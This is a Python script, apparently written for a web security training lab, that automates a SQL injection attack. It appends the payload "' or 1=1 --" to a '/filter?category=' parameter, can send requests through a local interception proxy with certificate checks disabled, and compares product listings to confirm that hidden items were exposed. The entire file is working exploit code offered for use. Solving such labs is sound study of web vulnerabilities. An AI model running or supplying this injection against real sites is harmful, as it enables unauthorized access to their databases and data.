import requests
from argparse import ArgumentParser
from bs4 import BeautifulSoup
import urllib3
from urllib3.exceptions import InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


parser = ArgumentParser()
parser.add_argument("mode", help ="mode", choices=["PROXY_ON","PROXY_OFF"])
parser.add_argument("-u", metavar="url", help="URL of the LAB")
parser.add_argument("-p", metavar="payload", help="Payload",default="' or 1=1 --")


args = parser.parse_args()
if args.u == None:
    print('[+] Provide the URL with "-u" .')
    exit()

proxies = {'http':'http://127.0.0.1:8080',"https":'http://127.0.0.1:8080'}

def get_items(url):
    global soup
    if args.mode == "PROXY_ON":
        r=requests.get(url,verify=False,proxies=proxies)
    if args.mode == "PROXY_OFF":
        r=requests.get(url,verify=False)
    soup = BeautifulSoup(r.content, 'lxml')
    if soup.text.__contains__("Server Error:"):
        print("[+] LAB EXPRIED, Restart the LAB")
        exit()
    elif soup.text.__contains__("Internal Server Error"):
        print("[+} The given payload did not work.")
        exit()
    all_items=[]
    for i in soup.find_all('h3'):
        all_items.append(i.text)
    return all_items

def url_check(final_url):
    if final_url.__contains__("//"):
        new = final_url.split(".net")
        new_url=new[0]+".net"+new[1].replace("//","/")
    return new_url

def exploit(url,payload):
    uri='/filter?category='
    final_url=url+uri+payload
    print("[+] For Manual exploitation paste this url in the browser : ",url_check(final_url))
    return final_url
    

url =args.u
print("[+] URL : ",url)
payload=args.p
print("[+] Payload : ",payload)
get_items(url) 
before = get_items(url)
final_url = url_check(exploit(url,payload))
after = get_items(final_url)

if len(before)<len(after):
    print("[+] List of products before the exploit : ")
    for i in before:
        print("         ",i)
    print("[+] List of products after the exploit : ")
    for i in after:
        print("         ",i)
    print("[+] Sucessfully retrevid all products")
else:
    print("[+] Something went wrong ")